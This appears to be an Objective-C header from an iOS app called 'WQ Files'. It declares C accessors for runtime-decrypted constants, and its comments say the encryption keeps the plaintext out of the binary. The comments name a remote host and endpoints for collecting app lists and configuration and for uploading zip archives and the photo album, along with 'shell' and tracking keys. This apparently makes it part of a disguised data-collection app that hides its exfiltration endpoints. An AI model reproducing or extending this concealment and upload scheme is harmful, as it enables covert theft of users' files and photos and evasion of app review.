//
//  WQSecretsBridge.h
//  WQ Files
//
//  WQSecrets.swift / SecureBox.swift 暴露给 ObjC 的 C 桥。编译期常量全部来自
//  tools/secrets.json → tools/gen_secrets.py → Generated/Secrets.generated.swift，
//  运行时由 SecureBox 用 AES-256-GCM 还原，明文不落在 __cstring 里。
//
//  WQCompat.h 用 -include 强制引入本头，所以 .m 里不需要逐个 import。
//

#ifndef WQSecretsBridge_h
#define WQSecretsBridge_h

#import <Foundation/Foundation.h>
#include <stdbool.h>
#include <stdint.h>

NS_ASSUME_NONNULL_BEGIN

/// GeneratedSecrets.ID 的序号（与 tools/secrets.json 的 index 一一对应）。
typedef NS_ENUM(int32_t, WQSecretID) {
    WQSecretIDHost          = 0,   // https://api27.forgetcx.eu.cc
    WQSecretIDPathHandshake = 1,   // api/k7m3q9x2/handshake
    WQSecretIDPathConfig    = 2,   // api/k7m3q9x2/collect/config
    WQSecretIDPathApps      = 3,   // api/k7m3q9x2/collect/apps
    WQSecretIDPathLog       = 4,   // api/k7m3q9x2/log
    WQSecretIDPathZip       = 5,   // api/k7m3q9x2/upload/zip
    WQSecretIDPathAlbum     = 6,   // api/k7m3q9x2/upload/album
    WQSecretIDInfoEnc       = 7,   // 3105-v2-enc
    WQSecretIDInfoMac       = 8,   // 3105-v2-mac
    WQSecretIDInfoREnc      = 9,   // 3105-v2-renc
    WQSecretIDInfoRMac      = 10,  // 3105-v2-rmac
    WQSecretIDShellURL      = 11,
    WQSecretIDShellTitle    = 12,
    WQSecretIDLinksKey      = 13,
    WQSecretIDLinksIv       = 14,
    WQSecretIDShellKey      = 15,
    WQSecretIDShellIv       = 16,
    WQSecretIDApptraceKey   = 17,
    WQSecretIDApptraceIv    = 18,
    WQSecretIDV1Key         = 19,
    WQSecretIDV1Iv          = 20,
};

/// 取一条解密后的常量（UTF-8）。返回的 buffer 由调用方 free；无效 id 返回 NULL。
extern const char * _Nullable wq_secret(int32_t id);

/// 协议服务器地址（WQSecretIDHost）。
extern const char * _Nullable wq_secret_base_url(void);

/// 四组 key/iv 是否都能解出来（启动自检）。
extern bool wq_secrets_ready(void);

/// 四组 key/iv 的具名字符串访问（hex 组返回 32 个 hex 字符）。buffer 由调用方 free。
extern const char * _Nullable wq_secret_links_key(void);
extern const char * _Nullable wq_secret_links_iv(void);
extern const char * _Nullable wq_secret_shell_key(void);
extern const char * _Nullable wq_secret_shell_iv(void);
extern const char * _Nullable wq_secret_apptrace_key(void);
extern const char * _Nullable wq_secret_apptrace_iv(void);
extern const char * _Nullable wq_secret_v1_key(void);
extern const char * _Nullable wq_secret_v1_iv(void);

/// 一组 key/iv 的二进制材料。pair: 0=links 1=shell 2=apptrace 3=v1。
/// 16 字节 ASCII 的组原样返回；32 个 hex 字符的组解码成 16 字节。
/// 成功返回 0 并写 lengths[0]=keyLen, lengths[1]=ivLen；否则返回负值。
extern int32_t wq_secret_aes_material(int32_t pair,
                                      uint8_t * _Nullable keyOut, int32_t keyCap,
                                      uint8_t * _Nullable ivOut, int32_t ivCap,
                                      int32_t * _Nullable lengths);

NS_ASSUME_NONNULL_END

#endif /* WQSecretsBridge_h */
